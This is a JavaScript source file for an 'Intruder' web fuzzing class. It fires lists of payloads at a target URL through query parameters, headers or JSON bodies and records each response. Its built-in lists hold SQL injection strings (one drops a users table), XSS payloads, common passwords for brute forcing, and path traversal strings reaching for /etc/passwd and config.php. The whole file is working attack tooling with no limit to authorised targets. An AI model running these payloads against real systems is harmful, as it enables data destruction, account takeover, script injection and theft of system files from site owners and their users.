const axios = require('axios');

class Intruder {
  static async runAttack(method, url, paramName, payloads, position = 'query') {
    const results = [];

    for (const payload of payloads) {
      const startTime = Date.now();

      try {
        let testUrl = url;
        const headers = {};
        let body = null;

        if (position === 'query') {
          testUrl = `${url}${url.includes('?') ? '&' : '?'}${paramName}=${encodeURIComponent(payload)}`;
        } else if (position === 'header') {
          headers[paramName] = payload;
        } else if (position === 'body') {
          body = JSON.stringify({ [paramName]: payload });
          headers['Content-Type'] = 'application/json';
        }

        const response = await axios({
          method,
          url: testUrl,
          headers,
          data: body,
          timeout: 10000,
          validateStatus: () => true,
        });

        const responseTime = Date.now() - startTime;

        results.push({
          payload,
          statusCode: response.status,
          responseLength: (response.data || '').toString().length,
          responseTime,
          timestamp: new Date(),
        });
      } catch (error) {
        const responseTime = Date.now() - startTime;

        results.push({
          payload,
          statusCode: 0,
          responseLength: 0,
          responseTime,
          error: error.message,
          timestamp: new Date(),
        });
      }
    }

    return results;
  }

  static generatePayloads(type, count = 100) {
    const sqlPayloads = [
      "' OR '1'='1",
      "' OR 1=1 --",
      "' AND 1=2 UNION SELECT NULL,NULL,NULL --",
      "'; DROP TABLE users; --",
      "' OR 'a'='a",
    ];

    const xssPayloads = [
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '"><script>alert(1)</script>',
      '<iframe src="javascript:alert(1)">',
      '<input onfocus=alert(1) autofocus>',
    ];

    const commonPasswords = [
      'password', '123456', '12345678', 'test123', 'admin', 'letmein',
      'Password1', 'qwerty', 'monkey', 'dragon', 'master', 'sunshine',
    ];

    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '../../config.php',
      '..%2F..%2Fetc%2Fpasswd',
      '....//....//etc/passwd',
      'http://example.com/../admin',
    ];

    const payloadMap = {
      sql: sqlPayloads,
      xss: xssPayloads,
      brute: commonPasswords,
      pathTraversal: pathTraversalPayloads,
    };

    return payloadMap[type] || [];
  }
}

module.exports = Intruder;
